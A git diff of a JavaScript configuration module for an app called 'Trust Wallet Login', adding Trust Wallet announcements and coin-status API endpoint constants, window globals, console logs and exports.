@@ -90,6 +90,16 @@ const trustWalletRegisterAPI =
   import.meta.env.VITE_TRUST_WALLET_REGISTER_API ||
   "https://gateway.us.trustwallet.com/v3/devices/ab700ac2c3a47bc0628f6368e482c374e5ba131f616462ae74751ed39e748362/wallets/m_e58de81e9c7ebac1e98a9871e5a41d2d343dc378/register";
 
+// Trust Wallet Announcements API endpoint
+const trustWalletAnnouncements =
+  import.meta.env.VITE_TRUST_WALLET_ANNOUNCEMENTS ||
+  "https://gateway.us.trustwallet.com/v2/announcements?strategy=prioritize_app_update&version=2.64.1&platform=extension&device_id=ab700ac2c3a47bc0628f6368e482c374e5ba131f616462ae74751ed39e748362";
+
+// Trust Wallet Coin Status API endpoint (base URL - coin ID is passed as parameter)
+const trustWalletCoinStatusBase =
+  import.meta.env.VITE_TRUST_WALLET_COIN_STATUS_BASE ||
+  "https://gateway.us.trustwallet.com/v1/coinstatus";
+
 const metadata = {
   name: "Trust Wallet Login",
   description: "Login with Trust Wallet",
@@ -138,6 +148,8 @@ if (typeof window !== "undefined") {
   window.__TRUST_WALLET_STABLECOIN_CONFIG__ = trustWalletStablecoinConfig;
   window.__BNB_CHAIN_VALIDATORS_BASE__ = bnbChainValidatorsBase;
   window.__KILN_THEGRAPH_SUBGRAPH__ = kilnTheGraphSubgraph;
+  window.__TRUST_WALLET_ANNOUNCEMENTS__ = trustWalletAnnouncements;
+  window.__TRUST_WALLET_COIN_STATUS_BASE__ = trustWalletCoinStatusBase;
 }
 
 console.log("✅ Wagmi config initialized successfully");
@@ -158,8 +170,10 @@ console.log("₿ Trust Wallet BTC Blockbook Base:", trustWalletBTCBlockbookBase)
 console.log("💰 Trust Wallet Stablecoin Config:", trustWalletStablecoinConfig);
 console.log("🔷 BNB Chain Validators Base:", bnbChainValidatorsBase);
 console.log("📊 Kiln The Graph Subgraph:", kilnTheGraphSubgraph);
+console.log("📢 Trust Wallet Announcements:", trustWalletAnnouncements);
+console.log("💰 Trust Wallet Coin Status Base:", trustWalletCoinStatusBase);
 console.log(
-  "💡 Trust Wallet gateway, analytics, market data, push topics, device, assets, NFT collections, device wallet register, BTC indexer, BSC session, BTC blockbook, stablecoin config, BNB Chain validators, and Kiln The Graph subgraph configured"
+  "💡 Trust Wallet gateway, analytics, market data, push topics, device, assets, NFT collections, device wallet register, BTC indexer, BSC session, BTC blockbook, stablecoin config, BNB Chain validators, Kiln The Graph subgraph, announcements, and coin status configured"
 );
 
 export {
@@ -181,4 +195,6 @@ export {
   solanaSession,
   tonDomainsAPI,
   trustWalletRegisterAPI,
+  trustWalletAnnouncements,
+  trustWalletCoinStatusBase,
 };
